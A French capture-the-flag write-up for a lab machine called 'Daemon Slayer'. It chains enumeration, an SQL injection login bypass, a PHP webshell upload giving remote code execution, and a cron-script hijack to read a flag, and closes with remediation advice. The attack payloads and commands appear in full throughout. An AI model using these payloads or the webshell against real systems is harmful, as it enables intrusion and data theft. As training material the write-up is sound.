Daemon Slayer

Cible : 10.10.0.4 Catégorie : Injection Difficulté : Medium Objectif : Lire user.txt Flag : EPI{j00_H4V3_n0_cH01C3_8UT_t0_90_0n_l1v1n9}

Vue d'ensemble de la chaîne d'exploitation
Recon (nmap + gobuster)
      │  deux instances Apache (80 & 445), indice sur :80 → application sur :445
      ▼
Injection SQL  (bypass d'authentification sur classes/Login.php?f=login)
      │  ' OR '1'='1' -- -   → connecté en tant qu'admin
      ▼
Upload de fichier non filtré  (classes/Users.php?f=save, champ "img")
      │  upload de shell.php → RCE en www-data
      ▼
Élévation de privilèges  (dossier writable d'un script cron exécuté en muzan)
      │  remplacement de /var/www/scripts/immortality_check.sh
      ▼
Lecture de user.txt  (copié dans /tmp par le cron de muzan)

Techniques utilisées : énumération, analyse du code source HTML/JS, injection SQL (bypass d'authentification), upload non filtré → RCE, élévation de privilèges via cron et permissions de dossier. Outils utilisés : nmap, gobuster (SecLists), curl, lecture du JavaScript de l'application.

1. Reconnaissance
1.1 Scan de ports
bash
nmap -sC -sV 10.10.0.4

Résultat (extrait) :

PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.68 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
445/tcp open  http    Apache httpd 2.4.68 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_smb2-time: Protocol negotiation failed (SMB2)

Observation clé : le port 445 correspond normalement à SMB, mais ici il sert du HTTP (la négociation SMB échoue car il n'y a pas de SMB — c'est un deuxième Apache). Les deux ports affichent la page Debian par défaut « It works ». Une anomalie sur un CTF est intentionnelle → il faut creuser.

1.2 Confirmation que les deux ports servent la même page
bash
curl -i http://10.10.0.4:80/
curl -i http://10.10.0.4:445/

Les deux renvoient une page identique — même Content-Length: 10701 et même ETag: "29cd-657476eb0c57b". Un ETag identique = exactement le même fichier octet pour octet. Le vrai contenu n'est donc pas à la racine, mais caché derrière d'autres chemins.

1.3 Énumération de répertoires

Premier essai avec une petite wordlist : rien d'utile.

bash
gobuster dir -u http://10.10.0.4:80/  -w /usr/share/dirb/wordlists/common.txt -x php,html,txt -t 40
gobuster dir -u http://10.10.0.4:445/ -w /usr/share/dirb/wordlists/common.txt -x php,html,txt -t 40

Uniquement l'index.html par défaut, les fichiers .ht* en 403, et server-status (403). Leçon : une petite wordlist a donné un faux « rien ici ». Passage à la liste medium de SecLists :

bash
gobuster dir -u http://10.10.0.4:80/ \
  -w ~/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html,zip,bak -t 50

→ Découverte de /lower/.

1.4 L'indice caché
bash
curl -s http://10.10.0.4/lower/
Good finding! Now the training is over, you must find the real path
<!-- 445 is samba, right ? -->

Interprétation : /lower/ est un indice, pas l'application. Le commentaire HTML pointe vers le port 445 (dont on a déjà prouvé qu'il fait du HTTP, pas du SMB). Énumération de 445 avec la liste medium :

bash
gobuster dir -u http://10.10.0.4:445/ \
  -w ~/SecLists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt \
  -x php,txt,html -t 50

→ Découverte de /upper/ (301 → http://10.10.0.4:445/upper/).

1.5 L'application
bash
curl -s http://10.10.0.4:445/upper/

Une application PHP/MySQL thématisée « Demon Human Food Tracker » (template AdminLTE). Le lien de connexion pointe vers /upper/admin.

2. Injection SQL — bypass d'authentification
2.1 Trouver le vrai endpoint de connexion

La page visible pointe vers /upper/admin, mais la lecture du JavaScript côté client révèle les véritables endpoints :

bash
curl -s http://10.10.0.4:445/upper/dist/js/script.js | grep -iE "login|classes|\.php"
url:_base_url_+'classes/Login.php?f=login'    (admin)
url:_base_url_+'classes/Login.php?f=flogin'   (faculty)
url:_base_url_+'classes/Login.php?f=slogin'   (student)

→ Cible de l'injection : classes/Login.php?f=login.

2.2 Test de l'injection

L'application fuite la requête backend dans sa réponse JSON (last_qry), ce qui confirme que l'entrée utilisateur est concaténée directement dans la chaîne SQL.

Premier essai, en supposant un utilisateur nommé admin :

bash
curl -s -c cookies.txt -X POST "http://10.10.0.4:445/upper/classes/Login.php?f=login" \
  --data-urlencode "username=admin' -- -" \
  --data-urlencode "password=x"
json
{"status":"incorrect","last_qry":"SELECT * from users where username = 'admin' -- -' and password = md5('x') "}

La syntaxe de l'injection fonctionne (le -- - commente la vérification du mot de passe), mais le résultat est incorrect → aucun utilisateur nommé admin n'existe, donc WHERE username='admin' ne correspond à aucune ligne.

2.3 Payload fonctionnel

Rendre la condition vraie pour toutes les lignes, sans dépendre d'un nom d'utilisateur connu :

bash
curl -s -c cookies.txt -X POST "http://10.10.0.4:445/upper/classes/Login.php?f=login" \
  --data-urlencode "username=' OR '1'='1' -- -" \
  --data-urlencode "password=x"
json
{"status":"success"}

Pourquoi ça marche :

L'application construit : SELECT * FROM users WHERE username = '<INPUT>' AND password = md5('<PW>')
L'injection ' OR '1'='1' -- - ferme la chaîne du username, ajoute une condition toujours vraie, et le -- - commente tout le reste (AND password = ...).
Requête effective : SELECT * FROM users WHERE username = '' OR '1'='1' → renvoie tous les utilisateurs.
L'application prend la première ligne (id le plus bas = le compte admin) et nous connecte en tant qu'admin.

Confirmation de l'accès admin :

bash
curl -s -b cookies.txt "http://10.10.0.4:445/upper/admin/" | grep -iE "<title>|dashboard|logout|welcome"
# → Dashboard, lien Logout, "Welcome to Demon Human Food Tracker"

Cause racine : entrée utilisateur concaténée dans le SQL. Correctif : requêtes préparées / paramétrées.

3. Upload de fichier non filtré → RCE
3.1 Localiser l'upload

Depuis la page de gestion des utilisateurs de l'admin :

bash
curl -s -b cookies.txt "http://10.10.0.4:445/upper/admin/?page=user" | grep -iE "input|file|name=|Users.php|f=save"

Découverte d'un champ fichier <input type="file" name="img"> et de l'endpoint de sauvegarde classes/Users.php?f=save (FormData multipart). Révèle aussi l'utilisateur existant : id=1, username muzan (Muzan Kibutsuji).

3.2 Création et upload du webshell
bash
# NOTE : créé dans ~ (home Linux). L'écriture sous /mnt/c était bloquée
# silencieusement (Windows/Defender supprimait le fichier) → travailler hors du mount Windows.
echo '<?php system($_GET["cmd"]); ?>' > shell.php

curl -s -i -b cookies.txt -X POST "http://10.10.0.4:445/upper/classes/Users.php?f=save" \
  -F "id=" -F "firstname=test" -F "lastname=test" \
  -F "username=pwntest1" -F "password=test123" \
  -F "img=@shell.php"
# → HTTP/1.1 200 OK, corps "1" (succès)

Un nouvel utilisateur a été créé (plutôt que modifier muzan) pour ne pas toucher un compte réel.

3.3 Retrouver le shell uploadé

L'application renomme les uploads avec un préfixe timestamp et les stocke dans un dossier accessible via le web. Retrouvé via l'avatar dans la liste des utilisateurs :

bash
curl -s -b cookies.txt "http://10.10.0.4:445/upper/admin/?page=user/list" | grep -iE "uploads|shell"
# → /upper/uploads/1790428320_shell.php

L'extension .php a été conservée — l'application n'a jamais validé le type de fichier.

3.4 Exécution de code à distance
bash
curl -s "http://10.10.0.4:445/upper/uploads/1790428320_shell.php?cmd=id"
uid=33(www-data) gid=33(www-data) groups=33(www-data)

RCE confirmée en tant que www-data. (Pas besoin de cookie — le dossier uploads est public.)

Pourquoi ça marche : Apache passe les fichiers .php à l'interpréteur PHP et les exécute, contrairement à une image servie comme simple donnée. Correctif : whitelist d'extensions, vérification du vrai MIME, renommage, stockage hors webroot, exécution désactivée dans le dossier d'upload.

4. Élévation de privilèges → muzan
4.1 Énumération
bash
curl -s -G ".../shell.php" --data-urlencode "cmd=cat /etc/crontab"
* * * * * muzan /var/www/scripts/immortality_check.sh

Un script s'exécute chaque minute en tant que muzan. La lecture directe du flag en www-data échoue (pas de sortie = permission refusée) :

bash
curl -s -G ".../shell.php" --data-urlencode "cmd=cat /home/muzan/user.txt"   # vide
4.2 La faille de permissions
bash
curl -s -G ".../shell.php" --data-urlencode "cmd=ls -la /var/www/scripts/"
drwxr-xr-x 1 www-data www-data 4096 ... .                       ← DOSSIER appartient à www-data
-rwxr-xr-x 1 muzan    muzan     535 ... immortality_check.sh    ← FICHIER appartient à muzan

Le script appartient à muzan et n'est pas modifiable par www-data. Cependant, le dossier appartient à www-data.

Concept Linux clé : le droit d'écriture sur un dossier permet de créer, renommer et supprimer des fichiers à l'intérieur, indépendamment du propriétaire de ces fichiers. Supprimer un fichier modifie le dossier (on retire son entrée), pas le fichier lui-même. www-data peut donc supprimer le script de muzan et le remplacer par le sien.

4.3 Détournement du script
bash
# supprimer le script de muzan (le droit d'écriture sur le dossier le permet)
curl -s -G ".../shell.php" --data-urlencode "cmd=rm /var/www/scripts/immortality_check.sh"

# écrire le nôtre avec le même nom
curl -s -G ".../shell.php" --data-urlencode "cmd=echo '#!/bin/bash' > /var/www/scripts/immortality_check.sh"
curl -s -G ".../shell.php" --data-urlencode "cmd=echo 'cp /home/muzan/user.txt /tmp/flag.txt' >> /var/www/scripts/immortality_check.sh"
curl -s -G ".../shell.php" --data-urlencode "cmd=echo 'chmod 644 /tmp/flag.txt' >> /var/www/scripts/immortality_check.sh"
curl -s -G ".../shell.php" --data-urlencode "cmd=chmod +x /var/www/scripts/immortality_check.sh"

Vérification (le propriétaire est maintenant www-data — l'empreinte de la technique) :

bash
curl -s -G ".../shell.php" --data-urlencode "cmd=cat /var/www/scripts/immortality_check.sh; ls -la /var/www/scripts/"
#!/bin/bash
cp /home/muzan/user.txt /tmp/flag.txt
chmod 644 /tmp/flag.txt
-rwxr-xr-x 1 www-data www-data 74 ... immortality_check.sh

Pourquoi il s'exécute en tant que muzan : la ligne du crontab nomme l'utilisateur (... muzan ...). Cron exécute la commande en tant que cet utilisateur, peu importe qui possède le fichier. On a détourné le chemin pointé par le cron ; cron a fourni l'identité de muzan.

4.4 Lecture du flag
bash
sleep 60
curl -s -G ".../shell.php" --data-urlencode "cmd=cat /tmp/flag.txt"
EPI{j00_H4V3_n0_cH01C3_8UT_t0_90_0n_l1v1n9}
5. Recommandations de remédiation
Vulnérabilité	Correctif
Injection SQL	Requêtes préparées / paramétrées ; ne jamais concaténer l'entrée dans le SQL. Ne pas fuiter la requête dans les réponses.
Upload non filtré	Whitelist d'extensions, vérifier le vrai type MIME, renommer les fichiers, stocker hors webroot, désactiver l'exécution dans le dossier d'upload.
Privesc via cron	Le dossier contenant un script exécuté par un utilisateur privilégié ne doit jamais être writable par un utilisateur moins privilégié. Restreindre le propriétaire et les permissions de /var/www/scripts/.
6. Notes / problèmes rencontrés
common.txt (dirb) était trop petite et a raté /lower/ et /upper/ ; la liste medium de SecLists les a trouvés. La profondeur de la wordlist compte.
host/445 (un chemin) vs host:445 (un port) — l'application est sur le port 445, atteint avec les deux-points.
Les fichiers écrits sous /mnt/c (mount Windows) étaient supprimés silencieusement (Windows/AV). Travailler depuis le home Linux ~ a résolu le problème.
bash: !/bin/bash: event not found — le ! déclenche l'expansion d'historique dans le shell interactif. Résolu avec set +H.